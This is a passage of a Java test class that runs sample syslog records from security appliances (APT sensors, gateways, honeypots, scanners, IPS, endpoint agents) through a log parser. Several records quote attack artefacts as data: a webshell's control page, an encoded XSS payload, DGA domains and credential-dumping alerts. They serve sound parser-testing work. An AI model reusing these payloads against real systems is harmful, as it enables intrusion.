      data = "dataAll contentsec test.idmclogger 2022-12-19T03:42:09.227467970Z \"gid\":\"902\",\"sip\":\"10.0.116.48\",\"sport\":\"10\",\"dip\":\"193.182.111.141\",\"dport\":\"999\",\"proto\":\"icmp\",\"sid\":8453186,\"isipv6\":0,\"policyid\":10,\"ipsid\":1,\"priority\":1,\"action\":3,\"contentfilter_type\":\"http 网 页 内 容 过 滤\",\"keyword\":\"http\",\"count\":10,\"alert_time\":60,\"msg\":\"test-----0\",\"message\":\"test-----0\",\"level\":\"info\"";
      parse(botuEngine, data);
      data = "dataAll filesec test.idmclogger 2022-12-19T03:42:09.497990587Z \"gid\":\"906\",\"sip\":\"10.0.116.11\",\"sport\":\"10\",\"dip\":\"193.182.111.141\",\"dport\":\"999\",\"proto\":\"icmp\",\"sid\":8453186,\"isipv6\":0,\"policyid\":10,\"ipsid\":1,\"priority\":1,\"action\":3,\"filename\":\"bb.txt\",\"filetype\":\"MSEXE\",\"app_protocol\":\"http\",\"count\":10,\"alert_time\":60,\"msg\":\"test-----9\",\"message\":\"test ---- 9\",\"level\":\"info\"";
      parse(botuEngine, data);*/
      data = "dataAll antiddospktlog test.idmclogger 2022-12-19T03:42:09.358199755Z \"attack_type\":\"port\u0002scan\",\"sip\":\"0.0.0.0\",\"sport\":\"0\",\"dip\":\"0.0.0.0\",\"dport\":\"0\",\"proto\":\"idmc\",\"message\":\"test ---- 2\",\"level\":\"info\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAptDbappsecurityDasAblSp800Syslog() {
    String parserFile = "./resources/parsers/apt_dbappsecurity_das-abl-sp800_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "July 26 19:15:40 2018 dbapp APT~2~1~2018-07-26 19:15:28~192.168.30.13:47348~192.168.30.78:80~WEB后门访问~可疑webshell~~高~1807261915280001820~NULL~GET /elmaliseker.asp~~192.168.30.78~200~3~1~0:90:b:12:68:75~0:c:29:b:46:bb~476023~User-Agent: Wget/1.12 (linux-gnu)<br/>Accept: */*<br/>Host: 192.168.30.78<br/>Connection: Keep-Alive<br/>Cookie: JSESSIONID=65E51BB9C2A40ADB96AD437C0338971D<br/>~~<br/>&lt;html&gt;<br/>&lt;head&gt;<br/>&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;<br/>&lt;title&gt;&lt;/title&gt;<br/>&lt;style&gt;<br/>select,input{font-family:Verdana;font-size:9pt}<br/>&lt;/style&gt;<br/>&lt;/head&gt;<br/>&lt;body&gt;<br/><br/>&lt;table&gt;<br/>&lt;tr&gt;<br/>&lt;td&gt;<br/>&lt;form name=frmChangeMode method=post action=\"/elmaliseker.asp\"&gt;<br/>&lt;input type=hidden name=command value=ChangeMode&gt;<br/>&lt;select name=mode onchange=\"frmChangeMode.submit()\"&gt;<br/>&lt;option value=0 selected&gt;FILE<br/>&lt;option value=1&gt;CMD<br/>&lt;option value=2&gt;SQL<br/>&lt;option value=3&gt;MAIL<br/>&lt;/select&gt;<br/>&lt;/form&gt;<br/>&lt;/td&gt;<br/><br/>&lt;/tr&gt;<br/>&lt;/table&gt;<br/><br/>&lt;input type=button value=Refresh onclick=\"Command('Refresh')\"&gt;<br/>&lt;input type=button value=\"New File\" onclick=\"Command('NewFile')\"&gt;<br/>&lt;input type=button value=\"New Folder\" onclick=\"Command('NewFolder')\"&gt;<br/>&lt;input type=button value=Upload~~成功";
      parse(botuEngine, data);
      data = "July 26 19:51:40 2018 dbapp APT~30~1~2018-07-26 19:01:34~192.168.27.229:0~114.114.114.114:53~DGA域名请求~DGA家族：conficker.b，感染病毒类型：蠕虫~~高~1807261901349914924~~请求解析域名：vxhpjcv.cc,dkqelwm.org,smnfkzx.net,kbfvnsz.net,uwvmlyo.net,okwmwfk.info,ujkfqef.net,zhvuhvs.org,gfrrrqn.cc,ivvzkmw.biz~~~3~4~0~b0:f9:63:39:42:f5~90:f1:b0:0:ce:80~0~~~~~成功";
      parse(botuEngine, data);
      data = "July 26 19:30:40 2018 dbapp APT~20~1~2018-07-26 19:10:20~192.168.198.204:50975~192.168.198.203:445~SMB远程溢出攻击~SMB远程命令执行成功（MS17-010）~~高~1807261910200002020~~trans2 request, session setup~~~0xC0000002~4~1~0:c:29:a3:1:b7~0:c:29:68:24:5a~0~~~~~成功";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAVGDbappsecurityDasGatewaySyslog() {
    String parserFile = "./resources/parsers/utm_dbappsecurity_das-gateway_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<6>Nov 29 14:09:52 HOST;530003300117111310721344;ipv4;3; operate:operator_name=admin;operate_ip=172.16.0.2;create_time=2017-11-29 14:09:52;level=notice;reason=add;result=success;managestyle=WEB;content=addipv6_policy configuration";
 /*     parse(botuEngine, data);
      data = "<4>Nov 29 14:09:52 HOST;110103300117111310721344;ipv4;3; system_state: 健康检查tcp 探测成功";
      parse(botuEngine, data);
      data = "<5>Feb 22 15:48:38 HOST;110104300117042052011873;ipv4;3;ips:user_id=2;user_name=192.168.1.171;policy_id=1;src_mac=08:9e:01:6b:9e:43;dst_mac=00:21:45:c7:00:c1;src_ip=192.168.1.171;dst_ip=192.168.88.1;src_port=37990;dst_port=80;XForwarded-For=;app_name=..(HTTP);protocol=TCP;app_protocol=HTTP;event_id=957736;event_name=log4j2..;event_type=..;agg_mode:0;agg_count:0;attack_success:0;level=notice;ctime=2021-02-22 15:48:38;action=drop";
      parse(botuEngine, data);
      data = "<4>Nov 28 16:48:13 HOST;000000800117081400904797;ipv4;3; AV:virus_name=avvirus;file_name=0823bdf784007435fc0741b270866a3c;user_name=192.168.8.90;user_id=2;policy_id=1;src_mac=00:01:7a:e1:63:0e;dst_mac=00:21:45:c7:00:c8;src_ip=192.168.8.90;dst_ip=119.147.194.95;src_port=19760;dst_port=8000;app_name=SMTP 邮 件 协 议 ;app_name_en=SMTP;protocol=TCP;app_protocol=SMTP; level=warning;ctime=2017-11-28 16:48:13;action=pass";
      parse(botuEngine, data);
      data = "<4>Nov 28 16:47:55 HOST;530003300117111310721344;ipv4;3; security_ipmac:user_name= ;src_ip=192.168.5.95;src_port=1863;dst_ip=121.10.215.99;dst_port=1863;name=ip-mac-bind;type=arp-attack;protocol=UDP;mac=28:d2:44:7c:2e:51;count=1;level=4;in_if_name=ge5;create_time=1511858873;end_time=1511858873;extend=;";
      parse(botuEngine, data);
      data = "<4>Nov 28 16:47:38 HOST;530003300117111310721344;ipv4;3; security_scan:user_name= ;src_ip=192.168.2.34;src_port=0;dst_ip=198.46.82.65;dst_port=0;name=ipsweep;type=scan-attack;protocol=ICMP;mac=00:21:45:c0:fa:00;count=1;level=4;in_if_name=ge2;create_time=1511858856;end_time=1511858856; extend=;";
      parse(botuEngine, data);
      data = "<4>Nov 28 16:47:55 HOST;530003300117111310721344;ipv4;3; security_flood:user_name= ;src_ip=192.168.5.95;src_port=1863;dst_ip=121.10.215.99;dst_port=1863;name=udpflood;type=flood-attack;protocol=UDP;mac=28:d2:44:7c:2e:51;count=1;level=4;in_if_name=ge5;create_time=1511858873;end_time=1511858873;extend=;";
      parse(botuEngine, data);
      data = "<4>Nov 28 16:47:38 HOST;530003300117111310721344;ipv4;3; security_abnormal_pkt:user_name=test;src_ip=20.1.1.5;src_port=0;dst_ip=30.1.1.2;dst_port=0;name=jolt2;type=abnormal-packet;protocol=ICMP;mac=00:40:01:55:24:34;count=8268;level=4;in_if_name=ge6;create_time=1406279692;end_time=1406279702;extend=;";
      parse(botuEngine, data);
      data = "<6>Nov 28 16:45:18 网 关 HA 主 ; 190001100116050743717653; ipv4; 3;waf_ruledefend:policy_name=56;url=\"http://CNZRHRbFWr/cgi-bin/activecalendar/data/m_4.php?css=%22%3e%3c%3c%3ciMg/S%20%22r%3d%27%3e%27%22%20%3d%22%3e%27%3e%22%20%27%27%20sRc%3d%22a%22%20%09OnErrOr%3d%22alert%28%27vhapgoixesdlf%27%29%22/a%3e%3e\";waf_method=GET;src_mac=00:0c:29:3b:f0:e5;dst_mac=00:0c:29:3b:f0:ef;src_ip=1.1.192.214;dst_ip=1.2.212.107;src_port=24057;dst_port=80;rule_id=904027;defend_type=\"XSS 攻击\";level=warning;action=允许;msg=\"请求参数中包含常见 XSS攻击 关 键 字 , 攻 击 字 符串 \"\"alert('vhapgoixesdlf')\"\", 原 始 字 符串\"\"css=\"\"><<<img/s\"\"r='>'\"\"=\"\">'>\"\"''src=\"\"a\"\"onerror=\"\"alert('vhapgoixesdlf')\"\"/a>>\"\"\"";
      parse(botuEngine, data);
      data = "<6>Nov 28 16:45:18 网关 HA 主; 190001100116050743717653; ipv4; 3; waf_advdefend:policy_name=56;url=\"http://139.224.37.118/dout.aspx?s=11052346&m=fast&id=972413703&client=DynGate&p=10000002\";waf_method=POST;src_mac=a4:4c:c8:27:a6:fa;dst_mac=68:91:d0:d0:0c:d9;src_ip=192.168.1.65;dst_ip=139.224.37.118;src_port=36928;dst_port=80;defend_type=\"精确访问控制\";level=warning;action=允许;msg=\"匹配中策略\"\"56\"\"中的精确访问控制规则 1\"";
      parse(botuEngine, data);
      data = "<6>Nov 28 16:45:18 网 关 HA 主 ; 190001100116050743717653; ipv4; 3; wpd:src=1.1.187.45;dst=1.2.93.151;service=pop3;login=VDvwcK;pwd_type=le8-let";
      parse(botuEngine, data);
      data = "<6>Nov 28 16:45:18 网 关 HA 主 ; 190001100116050743717653; ipv4; 3; bfd:occur_time=2020-08-18 09:14:07;src=192.168.24.80;dst=192.168.24.18;service=ftp;crack_success:0;crack_account:;action=ignore";
      parse(botuEngine, data);
      data = "<1>Jul 12 14:59:18 D12;530000000119051342010751;ipv4;3; servconn_policy:time=2019-07-12 14:59:18;policy_name=out;server_addr=192.168.24.80;out_addr=192.168.24.255;proto=UDP;port=137;action=1";
      parse(botuEngine, data);
      data = "<4>Jul 11 19:03:49 2.208-2039-master;530000500119032974562668;ipv4;3;behavior_model:src_ip=172.16.22.61;dst_ip=172.17.1.95;src_port=21833;dst_port=53;src_mac=02:1a:c5:01:15:3b;dst_mac=68:91:d0:d5:7f:7d;protocol=UDP;behavior_name_cn=DNS 隧 道 ;behavior_name_en=DNStunnel;behavior_detail=dnscat.27d5012b62965cbe1376c70aec84b1856d;behavior_desc=Dns traffic is too large,level=warning;action=拒绝";
      parse(botuEngine, data);
      data = "<6>Jul 12 15:14:47 D12;530000000119051342010751;ipv4;3; ti:ti_key=\"1.1.182.89\";ti_threat= 垃 圾 邮件;src_ip=1.1.182.89;dst_ip=1.2.91.45;src_port=19308;dst_port=80;protocol=TCP";
      parse(botuEngine, data);*/
      data = "Mar 04 16:19:48 192.168.24.100 Mar 07 15:20:08 Gateway;530000000118011573318101;ipv4;3; edr_spread:src_ip=192.168.24.45;dst_ip=188.172.208.138;src_port=30113;dst_port=80;src_mac=00:b0:c0:d0:e0:09;dst_mac=68:91:d0:d0:0c:db;protocol=TCP;action=0;desc_id=1;rule_name=test;level=warning;";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testHoneyPotJNSecSyslog() {
    String parserFile = "./resources/parsers/honeypot_jnsec_honeypot_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<12>Jan 13 15:55:08 trapbox {\"loglevel\": \"WARN\", \"logtype\": \"TRAPBOX_ATTACK\", \"message\": \"{\\\"totaltime\\\": 529.0, \\\"src_hwcorp\\\": [\\\"乐视智能设备\\\"], \\\"sensorname\\\": [\\\"sensor2021\\\"], \\\"hostowner\\\": \\\"未知\\\", \\\"risklevel\\\": \\\"低危主机\\\", \\\"totoalhoneyip\\\": 6, \\\"actiontags\\\": [\\\"大面积扫描\\\", \\\"多端口扫描(>5)\\\", \\\"近距离扫描(IP间距小于256)\\\", \\\"典型TCP内网嗅探\\\", \\\"UDP59608可疑访问\\\", \\\"APP-68BYTES可疑访问\\\"], \\\"src_ip\\\": \\\"192.168.1.159\\\", \\\"bytes_toserver\\\": 16446.0, \\\"pkts_toserver\\\": 177.0, \\\"starttime\\\": \\\"2020-01-13T14:55:07+08\\\", \\\"geoinfo\\\": \\\"内部网络\\\", \\\"totalsession\\\": 58, \\\"endtime\\\": \\\"2020-01-13T15:55:07+08\\\", \\\"src_mac\\\": [\\\"b0:1b:d2:2b:5b:f7\\\"], \\\"totoalports\\\": 41, \\\"dest_ip\\\": [\\\"192.168.1.100\\\", \\\"192.168.1.102\\\", \\\"192.168.1.103\\\", \\\"192.168.1.101\\\", \\\"192.168.1.104\\\", \\\"192.168.1.105\\\"]}\"}";
      parse(botuEngine, data);
      data = "<12>Dec 03 15:21:01 trapbox {\"loglevel\": \"INFO\", \"logtype\": \"TRAPBOX_RTSESSION\", \"message\": \"trapbox realtime session: sensor1000-ipv4-icmp-192.168.1.166-0-192.168.1.140-0\"}";
      parse(botuEngine, data);
      data = "<12>Dec 12 12:05:02 trapbox {\"loglevel\": \"INFO\", \"logtype\": \"TRAPBOX_RTSESSION\", \"message\": \"trapbox realtime session: sensor1002-ipv4-udp-10.57.180.177-28571-192.168.100.100-28571\"}";
      parse(botuEngine, data);
      data = "<12>Dec 12 16:20:50 trapbox {\"loglevel\": \"INFO\", \"logtype\": \"TRAPBOX_RTSESSION\", \"message\": \"trapbox realtime session: sensor1002-ipv4-tcp-10.57.118.3-65153-192.168.100.100-28571\"}";
      parse(botuEngine, data);
      data = "<12>Dec 12 16:42:37 trapbox {\"loglevel\": \"INFO\", \"logtype\": \"TRAPBOX_RTSESSION\", \"message\": \"trapbox realtime session: sensor1002-ipv4-icmp-10.57.118.2-0-192.168.100.50-0\"}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testVulnScannerDatacloudsecVulnscannerSyslog() {
    String parserFile = "./resources/parsers/vulnscanner_datacloudsec_vulnscanner_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<47>2017-09-25T14:45:17+08:00 localhost.localdomain dcs_scan[17772]:UserName=admin Ip=0:0:0:0:0:0:0:1 Event=开始探测 Date=2018-03-30 18:30:53.0 Status=1 Desct=ip=192.168.0.212;192.168.0.22,端口=80,443 LogType=1";
      /*parse(botuEngine, data);
      data = "<47>2017-09-25T14:45:17+08:00 localhost.localdomain dcs_scan[17772]: Timestamp=2017-09-25 14:45:17 VulType=sys Dest=127.0.0.1 VulName=OpenSSH多个漏洞 VulLevel=高危 OWASP= CVE=CVE-2015-6564, CVE-2015-6563, CVE-2015-5600 CNNVD= CNVD= CVSS=8.5 LogType=0";
      parse(botuEngine, data);*/
      data = "<7>Dec 11 03:00:32 scans_host scans: Timestamp=2023-12-11 03:00:04.0 VulType=bline Dest=10.220.2.0/24 VulName=密码复杂性要求 VulLevel=低危 OWASP= CVE= CNNVD= CNVD= CVSS= LogType=0";
      parse(botuEngine, data);
      data = "<7>Dec 10 23:35:56 scans_host scans: Timestamp=2023-12-10 23:34:37.0 VulType=sys Dest=10.220.2.40 VulName=CPE信息 VulLevel=信息 OWASP= CVE= CNNVD= CNVD= CVSS=0.0 LogType=0";
      parse(botuEngine, data);
      data = "<7>Dec 10 23:39:05 scans_host scans: Timestamp=2023-12-10 01:49:47.0 VulType=sys Dest=10.67.89.14 VulName=Nmap端口扫描 VulLevel=信息 OWASP= CVE= CNNVD= CNVD= CVSS=0.0 LogType=0";
      parse(botuEngine, data);
      data = "<7>Dec 10 23:37:12 scans_host scans: Timestamp=2023-12-10 23:37:08.0 VulType=sys Dest=10.67.89.243 VulName=Oracle MySQL  <= 5.6.46 / 5.7 <= 5.7.26安全更新(cpuapr2020)Linux VulLevel=中危 OWASP= CVE=CVE-2019-1547，CVE-2019-1549，CVE-2019-1552，CVE-2019-1563 CNNVD= CNVD= CVSS=5.0 LogType=0";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIPSDatacloudsecIPSSyslog() {
    String parserFile = "./resources/parsers/ips_datacloudsec_ips_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<214>Jun 14 13:34:48 ips IPS: SerialNum=\"0023211497301405024\" GenTime=\"2017-06-14 13:34:48\" SIP=\"223.202.62.232\" DIP=192.168.0.70 Proto=\"ICMP\" SPORT=\"0\" DPORT=\"0\" IN=\"eth4\" OUT=\"eth5\" SMAC=\"a4:56:02:3d:7b:37\" DMAC=\"50:7b:9d:fb:a6:d9\" CharacterName=\"PING响应数据包\" CharacterID=\"10345\" CharacterLevel=\"0\" SecurityPolicyName=\"default\" SecName=\"服务探测\" SecID=\"18\" Action=\"PASS\" Content=\"类型=0;\" Log_Count=\"1\"";
      parse(botuEngine, data);
      data = "<222>Jun 14 19:12:32 host CONFIG: SerialNum=\"0023211497301405024\" GenTime=\"2017-06-14 19:12:32\" SIP=192.168.0.70 DIP=192.168.1.72 UserName=\"adm\" Operate=\"显示配置\" ManageStyle=WEB Content=\"显示接口配置\"";
      parse(botuEngine, data);
      data = "<111>Jun 14 18:54:10 host SCAN: SerialNum=\"0023211497301405024\" GenTime=\"2017-06-14 18:54:10\" SIP=192.168.0.70 DIP=192.168.101.4 Proto=TCP SPORT=13716 DPORT=80 IN=\"eth4\" OUT=\"eth5\" Content=\"来自eth5接口的报文被阻断。\" Log_Count=\"1\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testXXXSangforSyslog() {
    String parserFile = "./resources/parsers/authserver_sangfor_atrust_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<150>Jun  6 17:37:33 localhost sdp-tunnel@userLog[244]: {\"target\":{\"flowLimit\":{\"downFlowLimit\":1310720,\"upFlowLimit\":1310720},\"details\":{\"app\":{\"web\":{\"request\":{\"url\":\"192.168.32.23:22\",\"method\":\"\",\"query\":\"\",\"backendUrl\":\"\",\"refer\":\"\",\"xForwardedFor\":\"\"},\"response\":{\"contentType\":\"\",\"contentLength\":\"\",\"contentDisposition\":\"\",\"attachment\":\"false\",\"redirectUri\":\"\",\"status\":\"\",\"server\":\"\"}},\"upstream\":{\"srcIp\":\"12.2.0.2\",\"srcPort\":\"41404\",\"port\":22,\"host\":\"192.168.32.23\"},\"tunnel\":{\"status\":\"200\"},\"status\":{\"negotiateTime\":0,\"resolveTime\":0,\"upstreamConnectTime\":1,\"upstreamResponseTime\":5996,\"recvBytes\":1662,\"sendBytes\":1218,\"responseTime\":6024,\"authTime\":0}}},\"type\":\"l3app\",\"id\":\"69d4aee0-adc6-11ee-9c8e-6bd6c8d3738c\",\"displayName\":\"192.168.31-39\"},\"traceId\":\"dac778715540a5ae-7973339772877\",\"client\":{\"ip\":\"82.157.139.31\",\"device\":\"SDPClient\",\"preProxyIp\":\"\",\"userAgent\":{\"processName\":\"svchost.exe\",\"processPath\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"os\":\"\",\"processFingerprint\":\"3201A28FCF51C575D238C6BBF716CDE4BC74AD37B3EAF48C8ADBCA15F081233E\",\"processDigtalSignature\":\"TrustAppClosed\",\"browser\":\"\",\"rawUserAgent\":\"\"},\"edrAgentId\":\"\",\"addr\":\"中国,北京市\",\"port\":\"59536\",\"mac\":\"52:54:00:32:27:AF\",\"virtualIp\":\"\",\"externalId\":\"\",\"id\":\"76D5EC9EA72A257AFB34A61D\",\"deviceName\":\"10_0_24_14\"},\"actor\":{\"detail\":\"connection of tunnel resource released\",\"type\":\"user\",\"groupPath\":\"/算力互联\",\"sessionID\":\"e580c57e-6550-4c3d-8279-cdc091680e3d_bc4597e9-d268-48f\",\"domain\":\"local\",\"label\":\"\",\"username\":\"sl_bx\",\"id\":\"80f7df60-f485-11ee-9c8e-6bd6c8d3738c\",\"phone\":\"\",\"email\":\"\"},\"source\":{\"displayName\":\"aTrust\",\"id\":\"966AA144\",\"type\":\"hybrid\"},\"event\":{\"mainType\":\"app\",\"level\":\"INFO\",\"result\":\"SUCCESS\",\"subType\":\"user.l3app.access\",\"reason\":\"\",\"timestamp\":\"2024-06-06 17:37:33\"}}";
      parse(botuEngine, data);
      data = "<142>Jun  6 17:35:30 aTrust sdp-crontab@systemLog[28194]: task(clean_mysql_dirty_trx) end,cost(60),err(<nil>) |Task|url=, traceid=071d308d34458000, ip=";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testACMRuiJieRG6008Syslog() {
    String parserFile = "./resources/parsers/acm_ruijie_rg-ws6008_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "* 2023-09-20T05:45:22.528342 %CLI-5-CONFIG: ---, vty0(172.27.90.46), command: configure";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAwitchRuiJiePOESyslog() {
    String parserFile = "./resources/parsers/switch_ruijie_poe_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<189> 008407: *Dec  7 19:26:33: %SYS-5-CONFIG_I: Configured from console by admin on vty0(10.57.118.1)";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testFirewallAsiainfoAisedgeSyslog() {
    String parserFile = "./resources/parsers/firewall_asiainfo_aisedge[7.0.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<46>Feb 01 10:20:22 ZJLSH-ZWY-CB-5F-AE-02 CEF:0|Asiainfo Security|AIS Edge EE|7.0.0.1.2282|2|IPS|6|dvc=10.100.55.251 src=172.28.31.186 dst=10.53.151.231 malName=-- malType=OTHER suser=-- dpt=18080 proto=6 application_id=67 application_attributeId=0 act=2 ruleName=Default type=2 ruleId=103044094 ipsruleName=Spring Cloud Function SpEL 表达式注入漏洞 fname=functionRouter domain=10.53.151.231:18080 request=10.53.151.231:18080/functionRouter wrsScore=0 urlCat=-- urlCategory2=-- urlCategory3=-- urlCategory4=-- spt=38633 direction=1 mailSender=-- mailRecipient= mailMsgSubject= fileHash= from=-- repeatTimes=-- log_type=Violation log threatName=exploit threatType=exploit";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }


  public void testEpsAsiainfoTrustOneSyslog() {
    String parserFile = "./resources/parsers/eps_asiainfo_trustone_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<2>Aug 18 10:05:42 localhost.localdomain CEF:0|Asiainfo Security|ESM|8.6.1137|100130|IOA|2|clf_processname=bash clf_pid=21701 clf_user=wyk subject_process=/usr/bin/bash first_time=2022-08-18 09:58:22.070 ioaname=获取凭证信息 host=localhost.localdomain (172.17.17.13) level=中危 status=未解决 handle_time=- technique=凭证转储 tactic=凭据获取 dvchost=localhost.localdomain dvc=172.17.17.13 register_deviceid=DD05C8B group_info=[(3, 'test2', 1, 4, 0, '0', '', 1660615264, 1660615264, 1, '{\"rules\": []}', '{}')] target_ps_path=/usr/sbin/vipw target_ps_cmd=vipw sha1=[] group_name=test2 client_mac=00:50:56:8f:ca:a1 thread_desc=攻击者通过凭证转储实现凭据获取 attack_sign=检测到利用 /usr/sbin/vipw 读取和修改凭证文件 tip={\"domain\": [], \"ip\": [], \"sha1\": [], \"url\": []} server_ip=172.17.17.13 server_device_id=DD05C8B server_name=localhost.localdomain client_ip=172.17.17.13 client_device_id=C0A622CE560446378B83 client_name=localhost.localdomain log_id=29";
      parse(botuEngine, data);
      data = "<3>Aug 18 13:52:47 localhost.localdomain CEF:0|Asiainfo Security|ESM|8.6.1137|100131|IOC|3|host=localhost.localdomain (172.17.17.13) iocname=黑客开始在全球范围内推送基于Log4Sh(205.185.115.217:80) first_time=2022-08-18 13:29:54 last_time=2022-08-18 13:41:00 level=3 handle_time=- status=未解决 ruletype=系统规则 clues=[\"规则黑客开始在全球范围内推送基于Log4Sh(205.185.115.217:80)出现目的IP等于205.185.115.217:80的线索，第一次出现时间为 2022-08-18 13:29:54，最后一次出现时间为 2022-08-18 13:41:00, 总计出现13条线索。\"] dvchost=localhost.localdomain dvc=172.17.17.13 register_deviceid=DD05C8B group_name=test2 client_mac=00:50:56:8f:ca:a1 server_ip=172.17.17.13 server_device_id=DD05C8B server_name=localhost.localdomain client_ip=172.17.17.13 client_device_id=C0A622CE560446378B83 client_name=localhost.localdomain log_id=2998 category_id=251 threat_label=['cobalt strike', 'mirai', 'kinsing'] rule_id=IOC000000007 mining_pool_link=205.185.115.217 process_name= process_sha1= target_ip= target_port= cmdline=";
      parse(botuEngine, data);
      data = "<0>May 11 14:06:00 localhost.localdomain CEF:0|Asiainfo Security|ESM|8.2.1005|100132|virus|0|device_id=9CB3C7D6C4DE45B480E5 timestamp=1652246941 virus_name=Test.DOS.EICAR.file virus_group=2 virus_type=212 identify_method=0 confidence_level=100 computer_name=hyl-PC ip=192.168.23.101 mac=00:0c:29:66:b6:11 file_path=/root/eicar.com file_sha1=3395856ce81f2b7382dee72602f798b642f14140 result=3 channel=0 scan_type=1 register_deviceid=CEF1B02 group_name=默认组 client_mac=00:50:56:8f:ca:a1 server_ip=172.17.17.13 server_device_id=DD05C8B server_name=localhost.localdomain client_ip=172.17.17.13 client_device_id=C0A622CE560446378B83 client_name=localhost.localdomain log_id=24";
      parse(botuEngine, data);
      data = "<3>May 11 14:06:00 localhost.localdomain CEF:0|Asiainfo Security|ESM|8.2.1005|100133|blacklist|3|device_id=1023F96188BB45AE906B blacklist_name=248 intelligence_info=7886F5333D91AE381A0ABCD8D2AA72DA232DDCA8 blacklist_type=1 computer_name=localhost.localdomain ip=172.17.17.18 intelligence_detail=/root/248 risk_level=3 action=3 register_deviceid=CEF1B02 group_name=默认组 client_mac=00:50:56:8f:ca:a1 server_ip=172.17.17.18 server_device_id=DD05C8B server_name=localhost.localdomain client_ip=172.17.17.67 client_device_id=C0A622CE560446378B83 client_name=localhost.localdomain log_id=24";
      parse(botuEngine, data);
      data = "<0>May 11 14:06:00 localhost.localdomain CEF:0|Asiainfo Security|ESM|8.2.1005|100134|firewall|0|device_id=1023F96188BB45AE906B start_time=1652249601 end_time=1652249608 intercept_num=8 computer_name=localhost.localdomain local_ip=172.17.17.18 remote_ip=10.21.144.111 direction=1 protocol_type=2 service_port=0 process_name=none rule_name=禁止ping111 register_deviceid=CEF1B02 group_name=默认组 client_mac=00:50:56:8f:ca:a1 server_ip=172.17.17.18 server_device_id=DD05C8B server_name=localhost.localdomain client_ip=172.17.17.18 client_device_id=C0A622CE560446378B83 client_name=localhost.localdomain log_id=2";
      parse(botuEngine, data);
      data = "<1>May 11 18:57:34 localhost.localdomain CEF:0|Asiainfo Security|ESM|9.0.1214|100135|web|1|device_id=0A64339F19E04B5CA1A9 create_time=1680162892 url=http://wrs51.winshipway.com/ risk_level=3 app=C:\\Users\\admin\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe computer_name=user-vmwarevirtualplatform ip=172.17.17.111 mac=00:50:56:8f:d9:29 risk_group=3 action=1 update_time=1683802292";
      parse(botuEngine, data);
      data  = "<2>May 11 18:58:50 localhost.localdomain CEF:0|Asiainfo Security|ESM|9.0.1214|100136|suspicious|2|device_id=0A64339F19E04B5CA1A9 timestamp=1680082367 so_filename=1.txt so_data=356a192b7913b04c54574d18c28d46e6395428ab so_filepath=C:\\Users\\admin\\Desktop\\ computer_name=user-vmwarevirtualplatform ip=172.17.17.111 os=Kylin V10 SP1 scan_result=2 so_scan_type=2 create_time=1683802292";
      parse(botuEngine, data);
